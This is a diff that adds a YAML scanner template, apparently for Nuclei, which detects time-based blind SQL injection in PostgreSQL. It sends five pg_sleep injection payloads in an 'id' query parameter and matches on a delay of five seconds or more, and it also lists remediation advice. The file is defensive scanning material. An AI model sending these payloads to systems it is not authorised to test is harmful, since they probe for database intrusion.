@@ -1,0 +1,27 @@
+id: sqli-time-based-blind-postgresql
+
+info:
+  name: PostgreSQL Time-Based Blind SQL Injection (pg_sleep)
+  author: security-researcher
+  severity: high
+  description: |
+    PostgreSQL pg_sleep() 함수를 이용한 시간 기반 블라인드 SQL 인젝션을 탐지합니다.
+  tags: sqli,blind,time-based,postgresql,injection
+  remediation: |
+    - PDO/pg_query_params Prepared Statement 사용
+    - statement_timeout 설정
+    - 최소 권한 원칙 적용
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1; SELECT pg_sleep(5)--"
+      - "{{BaseURL}}?id=1' AND (SELECT pg_sleep(5)) IS NOT NULL--"
+      - "{{BaseURL}}?id=1 AND 1=(SELECT 1 FROM pg_sleep(5))--"
+      - "{{BaseURL}}?id=1'; SELECT pg_sleep(5);--"
+      - "{{BaseURL}}?id=1 OR (SELECT pg_sleep(5)) IS NOT NULL--"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
